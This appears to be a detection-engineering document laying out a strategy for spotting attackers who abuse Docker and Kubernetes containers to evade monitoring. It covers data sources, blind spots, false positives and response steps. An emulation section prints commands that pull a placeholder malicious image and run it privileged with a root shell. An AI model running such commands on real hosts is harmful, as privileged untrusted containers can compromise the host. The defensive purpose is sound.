# Alerting & Detection Strategy: Detect Adversarial Attempts to Bypass Security Monitoring Using Containers

## Goal
The primary objective of this technique is to detect adversarial attempts to bypass security monitoring systems using containerization technologies. This includes identifying unusual patterns and activities associated with containers that could indicate malicious intent, such as deploying malware or unauthorized data exfiltration.

## Strategy Abstract

The detection strategy leverages data from multiple sources including network traffic logs, host logs (both container hosts and individual containers), application logs, and user activity monitoring. The analysis focuses on identifying patterns such as:

- Unusual or unauthorized changes to container images.
- Anomalous communication between containers or with external endpoints.
- Unexpected usage of privileged operations within containers.

Key data sources include Kubernetes audit logs, Docker daemon logs, and cloud provider-specific logging services (e.g., Azure Monitor, AWS CloudTrail).

## Technical Context

Adversaries exploit container technologies by deploying malicious workloads that can evade detection due to the dynamic nature of containerized environments. Techniques may involve:

- Using containers to host malware or command-and-control servers.
- Leveraging containers for lateral movement within a network.
- Employing containers to manipulate web credentials.

Real-world execution often involves altering legitimate container images with malicious code, using tools like `kubectl` to deploy these altered images, and masking communication through encrypted channels.

### Adversary Emulation Details

Adversaries might execute commands such as:

```bash
# Pull a modified container image
docker pull malicioususer/maliciousimage:latest

# Run the malicious container with elevated privileges
sudo docker run --rm -it --privileged malicioususer/maliciousimage:latest /bin/bash
```

Test scenarios could include setting up a benign environment and introducing these commands to observe behavior changes.

## Blind Spots and Assumptions

- **Assumption:** Regularly updated signatures and behavioral models are in place.
- **Blind Spot:** Zero-day exploits or novel container-based attack vectors may not be immediately detectable.
- **Assumption:** Comprehensive logging is enabled across all containerized environments.

## False Positives

Potential benign activities that might trigger false alerts include:

- Legitimate updates to container images by developers.
- Normal inter-container communication for microservices architecture.
- Scheduled maintenance tasks involving container restarts or redeployments.

## Priority
**Severity: High**

Justification: Containers are increasingly used in modern IT environments, making them attractive targets for adversaries. The ability to deploy and manage containers at scale can facilitate significant breaches if not properly monitored.

## Response

When an alert fires:

1. **Immediate Isolation:** Quarantine the affected container or node to prevent further spread.
2. **Incident Analysis:** Review logs to identify the origin of the malicious activity.
3. **Containment:** Apply network segmentation rules to isolate suspicious traffic.
4. **Remediation:** Remove and rebuild compromised containers from known good images.
5. **Post-Incident Review:** Update detection models and improve monitoring policies based on findings.
